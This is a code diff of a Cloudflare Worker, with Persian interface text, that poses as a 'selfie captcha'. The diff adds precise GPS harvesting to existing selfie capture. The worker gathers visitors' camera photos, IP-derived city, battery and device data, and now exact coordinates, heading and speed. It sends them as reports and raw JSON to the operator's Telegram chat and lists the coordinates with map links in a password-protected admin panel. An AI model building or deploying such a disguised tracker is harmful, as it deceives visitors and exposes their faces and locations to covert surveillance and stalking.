@@ -1,10 +1,10 @@
 // ============================================================
-//  Selfie Captcha Worker — v6 (Admin Panel)
+//  Selfie Captcha Worker — v7 (Geo + Admin Panel)
 // ============================================================
 //  Env vars:
 //    TELEGRAM_BOT_TOKEN   (required)
 //    TELEGRAM_CHAT_ID     (required)
-//    ADMIN_TOKEN          (required for admin panel + legacy /on /off)
+//    ADMIN_TOKEN          (required for admin + legacy /on /off)
 //    ADMIN_PASSWORD       (STRONGLY recommended — defaults to ADMIN_TOKEN)
 //    ADMIN_PATH           (optional — defaults to ADMIN_TOKEN)
 //    SESSION_SECRET       (optional)
@@ -30,21 +30,23 @@ export default {
       }
       if (url.pathname === '/on' || url.pathname === '/off') {
         if (request.method !== 'POST') return methodNotAllowed(['POST']);
-        return await handleToggle(request, env, url.pathname.slice(1));
+        return await handleToggle(request, env, 'selfie', url.pathname === '/on' ? 'on' : 'off');
+      }
+      if (url.pathname === '/geo/on' || url.pathname === '/geo/off') {
+        if (request.method !== 'POST') return methodNotAllowed(['POST']);
+        return await handleToggle(request, env, 'geo', url.pathname === '/geo/on' ? 'on' : 'off');
       }
       if (url.pathname === '/state') {
         if (request.method !== 'GET') return methodNotAllowed(['GET']);
-        return json({ state: await getSelfieState(env) });
+        return json({
+          selfie: await getState(env, 'selfie', 'on'),
+          geo: await getState(env, 'geo', 'off'),
+        });
       }
 
-      // 🔽 Admin panel routing
       const adminBase = getAdminBase(env);
-      if (
-        adminBase &&
-        (url.pathname === adminBase || url.pathname.startsWith(adminBase + '/'))
-      ) {
-        const sub =
-          url.pathname === adminBase ? '' : url.pathname.slice(adminBase.length + 1);
+      if (adminBase && (url.pathname === adminBase || url.pathname.startsWith(adminBase + '/'))) {
+        const sub = url.pathname === adminBase ? '' : url.pathname.slice(adminBase.length + 1);
         return await handleAdmin(request, env, sub, adminBase);
       }
 
@@ -71,42 +73,40 @@ function getAdminPassword(env) {
 }
 
 // ============================================================
-//  Selfie mode state
+//  State (per-feature: selfie / geo)
 // ============================================================
-const STATE_KEY = 'selfie';
-const STATE_URL = 'https://selfie-state.local/state';
 const RECENT_LOG_KEY = 'recent_log';
 const RECENT_LOG_MAX = 20;
 
-async function getSelfieState(env) {
+async function getState(env, key, defaultValue = 'on') {
   if (env.SELFIE_STATE) {
     try {
-      const v = await env.SELFIE_STATE.get(STATE_KEY);
-      return v === 'off' ? 'off' : 'on';
+      const v = await env.SELFIE_STATE.get(key);
+      if (v === 'on' || v === 'off') return v;
     } catch (e) {
       console.error('kv get failed', e);
     }
   }
   try {
     const cache = caches.default;
-    const hit = await cache.match(new Request(STATE_URL));
+    const hit = await cache.match(new Request(`https://selfie-state.local/${key}`));
     if (hit) {
       const v = await hit.text();
-      return v === 'off' ? 'off' : 'on';
+      if (v === 'on' || v === 'off') return v;
     }
   } catch {}
-  return 'on';
+  return defaultValue;
 }
 
-async function setSelfieState(env, state) {
+async function setState(env, key, state) {
   const value = state === 'off' ? 'off' : 'on';
   if (env.SELFIE_STATE) {
-    await env.SELFIE_STATE.put(STATE_KEY, value);
-    return { ok: true, storage: 'kv', state: value };
+    await env.SELFIE_STATE.put(key, value);
+    return { ok: true, storage: 'kv', feature: key, state: value };
   }
   const cache = caches.default;
   await cache.put(
-    new Request(STATE_URL),
+    new Request(`https://selfie-state.local/${key}`),
     new Response(value, {
       headers: { 'Cache-Control': 'public, max-age=31536000' },
     })
@@ -114,6 +114,7 @@ async function setSelfieState(env, state) {
   return {
     ok: true,
     storage: 'cache',
+    feature: key,
     state: value,
     warning: 'SELFIE_STATE KV not bound — per-colo only',
   };
@@ -137,9 +138,7 @@ async function logSubmission(env, entry) {
     const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
     let log = [];
     if (raw) {
-      try {
-        log = JSON.parse(raw);
-      } catch {}
+      try { log = JSON.parse(raw); } catch {}
     }
     if (!Array.isArray(log)) log = [];
     log.unshift(entry);
@@ -154,7 +153,6 @@ async function logSubmission(env, entry) {
 //  Admin session (HMAC)
 // ============================================================
 function adminSessionKey(env) {
-  // تغییر ADMIN_TOKEN یا ADMIN_PASSWORD → همهٔ سشن‌ها باطل می‌شن
   return `admin|${env.ADMIN_TOKEN || ''}|${env.ADMIN_PASSWORD || ''}`;
 }
 
@@ -194,9 +192,9 @@ const timingSafeEqual = (a, b) => {
 };
 
 // ============================================================
-//  Legacy /on /off (kept for scripting)
+//  Legacy API: /on /off /geo/on /geo/off
 // ============================================================
-async function handleToggle(request, env, action) {
+async function handleToggle(request, env, feature, action) {
   if (!env.ADMIN_TOKEN) return json({ error: 'admin_disabled' }, 403);
   const url = new URL(request.url);
   const provided =
@@ -204,7 +202,7 @@ async function handleToggle(request, env, action) {
   if (!timingSafeEqual(provided, env.ADMIN_TOKEN)) {
     return json({ error: 'unauthorized' }, 401);
   }
-  const result = await setSelfieState(env, action);
+  const result = await setState(env, feature, action);
   return json(result);
 }
 
@@ -215,27 +213,24 @@ async function handleAdmin(request, env, sub, adminBase) {
   const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
   const url = new URL(request.url);
   const nonce = crypto.randomUUID().replace(/-/g, '');
-  const cookieHeader = request.headers.get('Cookie') || '';
-  const sessionToken = parseCookie(cookieHeader, 'admin_sess');
+  const sessionToken = parseCookie(request.headers.get('Cookie') || '', 'admin_sess');
   const authed = await verifyAdminSession(sessionToken, env);
 
-  // GET {admin}
   if (request.method === 'GET' && sub === '') {
     if (authed) {
-      const state = await getSelfieState(env);
-      const log = await getRecentLog(env);
+      const [selfieState, geoState, log] = await Promise.all([
+        getState(env, 'selfie', 'on'),
+        getState(env, 'geo', 'off'),
+        getRecentLog(env),
+      ]);
       return adminResponse(
-        renderAdminDashboard(nonce, adminBase, state, env, request.cf || {}, log, url.searchParams),
+        renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, request.cf || {}, log, url.searchParams),
         nonce
       );
     }
-    return adminResponse(
-      renderAdminLogin(nonce, adminBase, url.searchParams),
-      nonce
-    );
+    return adminResponse(renderAdminLogin(nonce, adminBase, url.searchParams), nonce);
   }
 
-  // POST {admin}/login
   if (request.method === 'POST' && sub === 'login') {
     const rl = await rateLimit('adminlogin:' + ip, 5, 60);
     if (!rl.allowed) return redirect(adminBase + '?err=rate');
@@ -257,26 +252,29 @@ async function handleAdmin(request, env, sub, adminBase) {
     });
   }
 
-  // POST {admin}/logout
   if (request.method === 'POST' && sub === 'logout') {
     return redirect(adminBase, 303, {
       'Set-Cookie': `admin_sess=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0; Secure`,
     });
   }
 
-  // POST {admin}/toggle
   if (request.method === 'POST' && sub === 'toggle') {
     if (!authed) return redirect(adminBase);
+    let feature = '';
     let desired = '';
     try {
       const form = await request.formData();
+      feature = String(form.get('feature') || '');
       desired = String(form.get('state') || '');
     } catch {}
-    if (desired !== 'on' && desired !== 'off') {
+    if (!['selfie', 'geo'].includes(feature) || !['on', 'off'].includes(desired)) {
       return redirect(adminBase + '?err=state');
     }
-    await setSelfieState(env, desired);
-    return redirect(adminBase + '?ok=toggled&state=' + desired, 303);
+    await setState(env, feature, desired);
+    return redirect(
+      `${adminBase}?ok=toggled&feature=${feature}&state=${desired}`,
+      303
+    );
   }
 
   return new Response('Not Found', { status: 404 });
@@ -289,7 +287,8 @@ async function handlePage(request, env) {
   const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
   const token = await issueToken(secret);
   const nonce = crypto.randomUUID().replace(/-/g, '');
-  const selfieState = await getSelfieState(env);
+  const selfieState = await getState(env, 'selfie', 'on');
+  const geoState = await getState(env, 'geo', 'off');
 
   const headers = new Headers({
     'Content-Type': 'text/html;charset=UTF-8',
@@ -298,7 +297,7 @@ async function handlePage(request, env) {
     'X-Frame-Options': 'DENY',
     'Referrer-Policy': 'no-referrer',
     'Permissions-Policy':
-      'camera=(self), microphone=(), geolocation=(), ' +
+      'camera=(self), microphone=(), geolocation=(self), ' +
       'accelerometer=(self), gyroscope=(self), magnetometer=(self)',
     'Content-Security-Policy': [
       "default-src 'none'",
@@ -317,7 +316,7 @@ async function handlePage(request, env) {
     `hs_session=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=300; Secure`
   );
 
-  return new Response(renderHTML(nonce, selfieState), { headers });
+  return new Response(renderHTML(nonce, selfieState, geoState), { headers });
 }
 
 // ============================================================
@@ -342,7 +341,8 @@ async function handleUpload(request, env, ctx) {
     return json({ error: 'invalid_multipart' }, 400);
   }
 
-  const selfieMode = await getSelfieState(env);
+  const selfieMode = await getState(env, 'selfie', 'on');
+  const geoMode = await getState(env, 'geo', 'off');
 
   const photo = form.get('photo');
   const clientDataRaw = form.get('clientData');
@@ -395,7 +395,7 @@ async function handleUpload(request, env, ctx) {
   };
 
   const sessionId = crypto.randomUUID().slice(0, 8);
-  const reportHtml = buildReport(sessionId, serverInfo, clientInfo, selfieMode);
+  const reportHtml = buildReport(sessionId, serverInfo, clientInfo, selfieMode, geoMode);
 
   const tg = new TelegramClient(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID);
   const results = [];
@@ -415,19 +415,19 @@ async function handleUpload(request, env, ctx) {
   }
 
   const rawJson = JSON.stringify(
-    { sessionId, at: new Date().toISOString(), selfieMode, serverInfo, clientInfo },
+    { sessionId, at: new Date().toISOString(), selfieMode, geoMode, serverInfo, clientInfo },
     null,
     2
   );
   const docRes = await tg.sendDocument(
     new Blob([rawJson], { type: 'application/json' }),
     `data_${sessionId}.json`,
-    `📄 داده خام • <code>${sessionId}</code> • حالت: <b>${selfieMode}</b>`
+    `📄 داده خام • <code>${sessionId}</code> • سلفی: <b>${selfieMode}</b> • موقعیت: <b>${geoMode}</b>`
   );
   results.push({ step: 'raw_json', ok: !!docRes.ok });
 
-  // 🔽 log for admin panel
   if (ctx && ctx.waitUntil) {
+    const geo = clientInfo.geolocation || {};
     ctx.waitUntil(
       logSubmission(env, {
         ts: Date.now(),
@@ -436,6 +436,10 @@ async function handleUpload(request, env, ctx) {
         country: cf.country || null,
         city: cf.city || null,
         selfieMode,
+        geoMode,
+        lat: geo.success ? geo.latitude : null,
+        lon: geo.success ? geo.longitude : null,
+        accuracy: geo.success ? Math.round(geo.accuracy) : null,
         ua: String(request.headers.get('User-Agent') || '').slice(0, 80),
       })
     );
@@ -444,7 +448,7 @@ async function handleUpload(request, env, ctx) {
   if (!results.some((r) => r.ok)) {
     return json({ error: 'telegram_failed', results }, 502);
   }
-  return json({ ok: true, sessionId, selfieMode, results });
+  return json({ ok: true, sessionId, selfieMode, geoMode, results });
 }
 
 // ============================================================
@@ -486,11 +490,7 @@ class TelegramClient {
   }
   async _call(method, body, headers = {}) {
     try {
-      const res = await fetch(`${this.base}/${method}`, {
-        method: 'POST',
-        headers,
-        body,
-      });
+      const res = await fetch(`${this.base}/${method}`, { method: 'POST', headers, body });
       const data = await res.json();
       if (!data.ok) console.error(`telegram ${method}`, data);
       return data;
@@ -504,23 +504,51 @@ class TelegramClient {
 // ============================================================
 //  Report builder
 // ============================================================
-function buildReport(sessionId, server, client, selfieMode) {
+function buildReport(sessionId, server, client, selfieMode, geoMode) {
   const esc = escapeHtml;
   const cam = client.camera || {};
   const frame = client.capturedFrame || {};
   const orientation = client.orientation || {};
   const battery = client.battery || {};
+  const geo = client.geolocation || {};
   const zoom = cam.zoom;
   const iso = cam.iso;
   const when = client.utcTime || client.localTime || new Date().toISOString();
 
+  let geoBlock;
+  if (geoMode === 'off') {
+    geoBlock = `<pre>🔒 غیرفعال — توسط ادمین خاموش شده</pre>`;
+  } else if (geo.skipped) {
+    geoBlock = `<pre>درخواست نشد</pre>`;
+  } else if (!geo.supported) {
+    geoBlock = `<pre>مرورگر از Geolocation پشتیبانی نمی‌کند</pre>`;
+  } else if (geo.success) {
+    const lat = fmtCoord(geo.latitude);
+    const lon = fmtCoord(geo.longitude);
+    const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    geoBlock = `<pre>مختصات:     ${lat}, ${lon}
+دقت:         ${Math.round(geo.accuracy)} متر (${labelPrecision(geo.accuracy)})
+ارتفاع:      ${geo.altitude != null ? Math.round(geo.altitude) + ' m' : '—'}
+دقت ارتفاع:  ${geo.altitudeAccuracy != null ? Math.round(geo.altitudeAccuracy) + ' m' : '—'}
+جهت:         ${geo.heading != null ? Math.round(geo.heading) + '°' : '—'}
+سرعت:        ${geo.speed != null ? geo.speed.toFixed(2) + ' m/s' : '—'}
+زمان ثبت:    ${new Date(geo.timestamp).toISOString()}</pre>
+<a href="${esc(mapUrl)}">🗺 باز کردن در نقشه</a>`;
+  } else {
+    geoBlock = `<pre>دریافت نشد: ${esc(geo.error || 'unknown')}${
+      geo.message ? '\n' + esc(geo.message) : ''
+    }</pre>`;
+  }
+
   const lines = [
     `🔐 <b>گزارش سلفی</b>`,
     `<i>شناسه:</i> <code>${sessionId}</code>`,
-    `<i>حالت سلفی:</i> ${
-      selfieMode === 'on' ? '🟢 روشن (با تصویر)' : '🔴 خاموش (بدون تصویر)'
-    }`,
+    `<i>سلفی:</i> ${selfieMode === 'on' ? '🟢 روشن' : '🔴 خاموش'} • <i>موقعیت:</i> ${geoMode === 'on' ? '🟢 روشن' : '🔴 خاموش'}`,
     `<i>زمان:</i> ${esc(when)}`,
+    ``,
+
+    `📍 <b>موقعیت دقیق (GPS)</b>`,
+    geoBlock,
     ``,
 
     `🔋 <b>وضعیت باتری</b>`,
@@ -625,6 +653,9 @@ const escapeHtml = (v) =>
 const fmtNum = (n, digits = 1) =>
   typeof n === 'number' && isFinite(n) ? n.toFixed(digits) : '—';
 
+const fmtCoord = (n) =>
+  typeof n === 'number' && isFinite(n) ? n.toFixed(6) : '—';
+
 const fmtSeconds = (s) => {
   if (typeof s !== 'number' || !isFinite(s) || s <= 0) return '—';
   const h = Math.floor(s / 3600);
@@ -632,6 +663,15 @@ const fmtSeconds = (s) => {
   if (h > 0) return `${h} ساعت ${m} دقیقه`;
   if (m > 0) return `${m} دقیقه`;
   return `${Math.floor(s)} ثانیه`;
+};
+
+const labelPrecision = (acc) => {
+  if (typeof acc !== 'number' || !isFinite(acc)) return '—';
+  if (acc < 20) return 'عالی (GPS)';
+  if (acc < 50) return 'بالا (GPS)';
+  if (acc < 200) return 'متوسط (Wi-Fi)';
+  if (acc < 1000) return 'پایین (شبکه)';
+  return 'تقریبی (IP)';
 };
 
 async function issueToken(secret) {
@@ -725,26 +765,26 @@ const redirect = (location, status = 302, extraHeaders = {}) => {
   return new Response(null, { status, headers });
 };
 
-function adminResponse(html, nonce, extraHeaders = {}) {
-  const headers = new Headers({
-    'Content-Type': 'text/html;charset=UTF-8',
-    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
-    'X-Content-Type-Options': 'nosniff',
-    'X-Frame-Options': 'DENY',
-    'Referrer-Policy': 'no-referrer',
-    'Content-Security-Policy': [
-      "default-src 'none'",
-      `script-src 'nonce-${nonce}'`,
-      `style-src 'nonce-${nonce}'`,
-      "connect-src 'self'",
-      "img-src 'self' data:",
-      "base-uri 'none'",
-      "form-action 'self'",
-      "frame-ancestors 'none'",
-    ].join('; '),
+function adminResponse(html, nonce) {
+  return new Response(html, {
+    headers: {
+      'Content-Type': 'text/html;charset=UTF-8',
+      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
+      'X-Content-Type-Options': 'nosniff',
+      'X-Frame-Options': 'DENY',
+      'Referrer-Policy': 'no-referrer',
+      'Content-Security-Policy': [
+        "default-src 'none'",
+        `script-src 'nonce-${nonce}'`,
+        `style-src 'nonce-${nonce}'`,
+        "connect-src 'self'",
+        "img-src 'self' data:",
+        "base-uri 'none'",
+        "form-action 'self'",
+        "frame-ancestors 'none'",
+      ].join('; '),
+    },
   });
-  for (const [k, v] of Object.entries(extraHeaders)) headers.set(k, v);
-  return new Response(html, { headers });
 }
 
 // ============================================================
@@ -752,50 +792,42 @@ function adminResponse(html, nonce, extraHeaders = {}) {
 // ============================================================
 const ADMIN_CSS = `
   :root {
-    --accent:#4a90e2; --ok:#22a06b; --ok-bg:#e8f7ef;
-    --err:#d93636; --err-bg:#fdeaea;
+    --accent:#4a90e2; --ok:#22a06b; --ok-bg:#e8f7ef; --ok-border:#b7e6cd;
+    --err:#d93636; --err-bg:#fdeaea; --err-border:#f3c2c2;
     --warn:#e07c2d; --warn-bg:#fdf3e8;
-    --muted:#6b7280; --border:#dcdfe4; --bg:#f5f6f8;
-    --text:#1f2328;
+    --muted:#6b7280; --border:#dcdfe4; --bg:#f5f6f8; --text:#1f2328;
   }
   * { box-sizing: border-box; }
   html, body { margin: 0; min-height: 100%; }
   body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                  "Helvetica Neue", Arial, sans-serif;
-    background: var(--bg); color: var(--text);
-    padding: 16px;
+    background: var(--bg); color: var(--text); padding: 16px;
     display: flex; align-items: flex-start; justify-content: center;
   }
-  .wrap { width: 100%; max-width: 640px; }
+  .wrap { width: 100%; max-width: 680px; }
   .card {
     background:#fff; border:1px solid var(--border); border-radius:14px;
-    box-shadow: 0 6px 24px rgba(15,23,42,.06);
-    padding: 20px;
+    box-shadow: 0 6px 24px rgba(15,23,42,.06); padding: 20px;
   }
   h1 { font-size:18px; margin:0; }
   h2 { font-size:15px; margin: 0 0 12px; }
   .subtitle { color: var(--muted); font-size:13px; margin: 4px 0 18px; }
-  .alert {
-    padding: 10px 12px; border-radius: 8px; font-size: 13px;
-    margin-bottom: 14px;
-  }
+  .alert { padding: 10px 12px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; }
   .alert.err { background: var(--err-bg); color: var(--err); }
   .alert.ok  { background: var(--ok-bg);  color: var(--ok); }
   input[type=password] {
     width: 100%; padding: 12px 14px; font-size: 15px;
     border: 1px solid var(--border); border-radius: 10px;
-    background: #fff; color: var(--text); outline: none;
-    transition: border-color .15s;
+    background: #fff; color: var(--text); outline: none; transition: border-color .15s;
   }
   input[type=password]:focus { border-color: var(--accent); }
   .btn {
     display: inline-flex; align-items: center; justify-content: center; gap: 8px;
     padding: 11px 16px; font-size: 14px; font-weight: 500;
     border: 1px solid var(--border); border-radius: 10px;
-    background:#fff; color: var(--text); cursor:pointer;
-    text-decoration:none; transition: all .15s;
-    font-family: inherit;
+    background:#fff; color: var(--text); cursor:pointer; text-decoration:none;
+    transition: all .15s; font-family: inherit;
   }
   .btn:hover { background: #f3f4f6; }
   .btn-primary { background: var(--accent); border-color: var(--accent); color:#fff; }
@@ -805,32 +837,43 @@ const ADMIN_CSS = `
   .btn-success { background: var(--ok); border-color: var(--ok); color:#fff; }
   .btn-success:hover { filter: brightness(1.05); }
   .btn-block { width: 100%; }
-  .login-icon {
-    font-size: 36px; text-align:center; margin-bottom: 8px;
-  }
-  .login-card h1 { text-align: center; }
-  .login-card .subtitle { text-align: center; }
+  .btn-sm { padding: 7px 12px; font-size: 12px; }
+  .login-icon { font-size: 36px; text-align:center; margin-bottom: 8px; }
+  .login-card h1, .login-card .subtitle { text-align: center; }
   .row-between {
-    display: flex; align-items: center; justify-content: space-between;
-    gap: 12px; margin-bottom: 16px;
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+    margin-bottom: 16px;
   }
-  .status-card {
-    text-align: center; padding: 22px 16px;
-    border-radius: 14px; border: 1px solid var(--border);
-    margin-bottom: 16px; transition: all .2s;
+  .toolbar {
+    display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
+    margin-bottom: 16px;
   }
-  .status-card.on  { background: var(--ok-bg);  border-color: #b7e6cd; }
-  .status-card.off { background: var(--err-bg); border-color: #f3c2c2; }
-  .status-badge {
-    font-size: 22px; font-weight: 700; margin-bottom: 6px;
-    letter-spacing: .5px;
+  .features-grid {
+    display: grid; grid-template-columns: 1fr; gap: 14px; margin-bottom: 18px;
   }
-  .status-card.on .status-badge  { color: var(--ok); }
-  .status-card.off .status-badge { color: var(--err); }
-  .status-hint { font-size: 12px; color: var(--muted); margin-bottom: 16px; }
+  @media (min-width: 500px) { .features-grid { grid-template-columns: 1fr 1fr; } }
+  .feature-card {
+    border: 1px solid var(--border); border-radius: 12px; padding: 16px;
+    background: #fff; display: flex; flex-direction: column;
+    transition: all .2s;
+  }
+  .feature-card.active { border-color: var(--ok-border); background: #f7fdfa; }
+  .feature-card.inactive { border-color: var(--err-border); background: #fefafa; }
+  .feature-head { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+  .feature-icon { font-size: 22px; line-height: 1; }
+  .feature-title { font-weight: 600; font-size: 14px; flex: 1; }
+  .feature-status {
+    font-size: 11px; padding: 3px 8px; border-radius: 20px; font-weight: 600;
+    white-space: nowrap;
+  }
+  .feature-status.on  { background: var(--ok-bg);  color: var(--ok); }
+  .feature-status.off { background: var(--err-bg); color: var(--err); }
+  .feature-hint {
+    font-size: 12px; color: var(--muted); margin-bottom: 12px;
+    line-height: 1.6; flex: 1;
+  }
   .info-grid {
-    display: grid; grid-template-columns: repeat(3, 1fr);
-    gap: 10px; margin-bottom: 16px;
+    display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 18px;
   }
   .info-item {
     background: #fafbfc; border: 1px solid var(--border);
@@ -838,14 +881,31 @@ const ADMIN_CSS = `
   }
   .info-label { font-size: 11px; color: var(--muted); display:block; margin-bottom: 3px; }
   .info-value { font-size: 13px; font-weight: 500; }
+  .info-value.small { font-size: 11px; }
   code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
-  .recent h2 { margin-top: 8px; }
-  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  .table-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; min-width: 480px; }
   th, td { padding: 8px 6px; text-align: right; border-bottom: 1px solid var(--border); }
   th { color: var(--muted); font-weight: 500; background: #fafbfc; }
   tr:last-child td { border-bottom: none; }
   .empty { text-align: center; color: var(--muted); padding: 16px !important; }
+  .map-link {
+    color: var(--accent); text-decoration: none; font-family: ui-monospace, monospace;
+    font-size: 11px;
+  }
+  .map-link:hover { text-decoration: underline; }
+  .checks {
+    display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px 16px;
+    font-size: 12px; padding: 12px; background: #fafbfc;
+    border: 1px solid var(--border); border-radius: 10px;
+  }
+  .checks .ck { display: flex; align-items: center; gap: 8px; }
+  .ck-icon { font-size: 13px; }
+  .ck-icon.ok  { color: var(--ok); }
+  .ck-icon.miss { color: var(--err); }
+  .ck-icon.warn { color: var(--warn); }
   .mt { margin-top: 16px; }
+  .mt-sm { margin-top: 8px; }
 `;
 
 // ============================================================
@@ -886,10 +946,34 @@ function renderAdminLogin(nonce, adminBase, params) {
 }
 
 // ============================================================
+//  Admin: Feature card helper
+// ============================================================
+function featureCard(opts) {
+  const { icon, title, active, hint, feature, onLabel, offLabel } = opts;
+  return `
+  <div class="feature-card ${active ? 'active' : 'inactive'}">
+    <div class="feature-head">
+      <span class="feature-icon">${icon}</span>
+      <span class="feature-title">${title}</span>
+      <span class="feature-status ${active ? 'on' : 'off'}">${active ? 'روشن' : 'خاموش'}</span>
+    </div>
+    <div class="feature-hint">${hint}</div>
+    <form method="POST" action="${opts.adminBase}/toggle" data-confirm="آیا مطمئنید؟">
+      <input type="hidden" name="feature" value="${feature}">
+      <input type="hidden" name="state" value="${active ? 'off' : 'on'}">
+      <button type="submit" class="btn btn-block ${active ? 'btn-danger' : 'btn-success'}">
+        ${active ? offLabel : onLabel}
+      </button>
+    </form>
+  </div>`;
+}
+
+// ============================================================
 //  Admin: Dashboard
 // ============================================================
-function renderAdminDashboard(nonce, adminBase, state, env, cf, log, params) {
-  const isOn = state === 'on';
+function renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, cf, log, params) {
+  const selfieOn = selfieState === 'on';
+  const geoOn = geoState === 'on';
   const storage = env.SELFIE_STATE ? 'KV' : 'Cache (per-colo)';
   const now = new Date();
   const timeStr = now.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
@@ -899,26 +983,61 @@ function renderAdminDashboard(nonce, adminBase, state, env, cf, log, params) {
   let toast = '';
   if (okP === 'login') toast = `<div class="alert ok">✅ ورود موفق.</div>`;
   else if (okP === 'toggled') {
+    const f = params.get('feature');
     const s = params.get('state');
-    toast = `<div class="alert ok">✅ وضعیت به «${
+    const label = f === 'geo' ? 'موقعیت' : 'سلفی';
+    toast = `<div class="alert ok">✅ ${label} به «${
       s === 'on' ? 'روشن' : 'خاموش'
     }» تغییر کرد.</div>`;
-  } else if (errP === 'state') toast = `<div class="alert err">❌ وضعیت نامعتبر.</div>`;
+  } else if (errP === 'state') toast = `<div class="alert err">❌ درخواست نامعتبر.</div>`;
 
   const rows = (log || []).length
     ? log
-        .map(
-          (e) => `
-        <tr>
-          <td><code>${new Date(e.ts || 0).toISOString().slice(11, 19)}</code></td>
-          <td><code>${escapeHtml(e.ip || '—')}</code></td>
-          <td>${escapeHtml(e.country || '—')}</td>
-          <td>${escapeHtml(e.city || '—')}</td>
-          <td>${e.selfieMode === 'on' ? '🟢' : '🔴'}</td>
-        </tr>`
-        )
+        .map((e) => {
+          const coords =
+            e.lat != null && e.lon != null
+              ? `<a class="map-link" href="${escapeHtml(
+                  `https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lon}`
+                )}" target="_blank" rel="noopener">${e.lat.toFixed(
+                  3
+                )}, ${e.lon.toFixed(3)}</a>`
+              : '<span style="color:var(--muted)">—</span>';
+          return `
+          <tr>
+            <td><code>${new Date(e.ts || 0).toISOString().slice(11, 19)}</code></td>
+            <td><code>${escapeHtml(e.ip || '—')}</code></td>
+            <td>${escapeHtml(e.city || '—')}${e.country ? '، ' + escapeHtml(e.country) : ''}</td>
+            <td>${e.selfieMode === 'on' ? '🟢' : '🔴'}</td>
+            <td>${coords}</td>
+          </tr>`;
+        })
         .join('')
     : '<tr><td colspan="5" class="empty">هیچ ارسالی ثبت نشده</td></tr>';
+
+  const checks = [
+    { label: 'TELEGRAM_BOT_TOKEN', ok: !!env.TELEGRAM_BOT_TOKEN },
+    { label: 'TELEGRAM_CHAT_ID', ok: !!env.TELEGRAM_CHAT_ID },
+    { label: 'ADMIN_TOKEN', ok: !!env.ADMIN_TOKEN },
+    {
+      label: 'ADMIN_PASSWORD',
+      ok: !!env.ADMIN_PASSWORD,
+      warn: !env.ADMIN_PASSWORD,
+    },
+    {
+      label: 'KV (SELFIE_STATE)',
+      ok: !!env.SELFIE_STATE,
+      warn: !env.SELFIE_STATE,
+    },
+    { label: 'SESSION_SECRET', ok: !!env.SESSION_SECRET, optional: true },
+  ];
+
+  const checksHtml = checks
+    .map((c) => {
+      const icon = c.ok ? '✅' : c.warn ? '⚠️' : c.optional ? '➖' : '❌';
+      const cls = c.ok ? 'ok' : c.warn ? 'warn' : c.optional ? '' : 'miss';
+      return `<div class="ck"><span class="ck-icon ${cls}">${icon}</span><span>${c.label}</span></div>`;
+    })
+    .join('');
 
   return `<!DOCTYPE html>
 <html lang="fa" dir="rtl">
@@ -935,34 +1054,45 @@ function renderAdminDashboard(nonce, adminBase, state, env, cf, log, params) {
       <div class="row-between">
         <div>
           <h1>🔐 پنل مدیریت</h1>
-          <p class="subtitle" style="margin:4px 0 0">${escapeHtml(
-            new URL(adminBase, 'https://x').hostname || adminBase
-          )}</p>
+          <p class="subtitle" style="margin:4px 0 0">${escapeHtml(adminBase)}</p>
         </div>
         <form method="POST" action="${adminBase}/logout">
-          <button type="submit" class="btn">خروج</button>
+          <button type="submit" class="btn btn-sm">خروج</button>
         </form>
       </div>
 
       ${toast}
 
-      <div class="status-card ${isOn ? 'on' : 'off'}">
-        <div class="status-badge">${isOn ? '🟢 روشن' : '🔴 خاموش'}</div>
-        <div class="status-hint">
-          ${
-            isOn
-              ? 'از کاربر دوربین درخواست می‌شود و سلفی ارسال می‌گردد'
-              : 'دوربین درخواست نمی‌شود — فقط داده‌های دیگر ارسال می‌گردد'
-          }
-        </div>
-        <form method="POST" action="${adminBase}/toggle" data-confirm="آیا مطمئنید؟">
-          <input type="hidden" name="state" value="${isOn ? 'off' : 'on'}">
-          <button type="submit" class="btn btn-block ${
-            isOn ? 'btn-danger' : 'btn-success'
-          }">
-            ${isOn ? '🔴 خاموش کردن سلفی' : '🟢 روشن کردن سلفی'}
-          </button>
-        </form>
+      <div class="toolbar">
+        <a class="btn btn-sm" href="/" target="_blank" rel="noopener">↗️ صفحهٔ کپچا</a>
+        <a class="btn btn-sm" href="${adminBase}">🔄 بروزرسانی</a>
+      </div>
+
+      <div class="features-grid">
+        ${featureCard({
+          icon: '📸',
+          title: 'سلفی',
+          active: selfieOn,
+          hint: selfieOn
+            ? 'از کاربر دوربین درخواست می‌شود و تصویر ارسال می‌گردد'
+            : 'دوربین درخواست نمی‌شود — سایر داده‌ها همچنان ارسال می‌شوند',
+          feature: 'selfie',
+          onLabel: '🟢 روشن کردن سلفی',
+          offLabel: '🔴 خاموش کردن سلفی',
+          adminBase,
+        })}
+        ${featureCard({
+          icon: '📍',
+          title: 'موقعیت دقیق',
+          active: geoOn,
+          hint: geoOn
+            ? 'از کاربر اجازهٔ موقعیت مکانی خواسته می‌شود (GPS با دقت بالا)'
+            : 'موقعیت درخواست نمی‌شود — فقط مختصات IP از Cloudflare ثبت می‌شود',
+          feature: 'geo',
+          onLabel: '🟢 روشن کردن موقعیت',
+          offLabel: '🔴 خاموش کردن موقعیت',
+          adminBase,
+        })}
       </div>
 
       <div class="info-grid">
@@ -976,27 +1106,31 @@ function renderAdminDashboard(nonce, adminBase, state, env, cf, log, params) {
         </div>
         <div class="info-item">
           <span class="info-label">زمان سرور</span>
